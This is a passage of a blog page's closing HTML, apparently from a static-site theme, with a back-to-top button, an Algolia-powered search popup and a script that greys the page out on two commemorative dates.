id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div><script>function initMourn() {
  const date = new Date();
  const today = (date.getMonth() + 1) + "-" + date.getDate()
  const mourn_days = ["4-4","9-18"]
  if (mourn_days.includes(today)) {
    document.documentElement.style.filter = "grayscale(1)";
  }
}
initMourn();</script></body></html>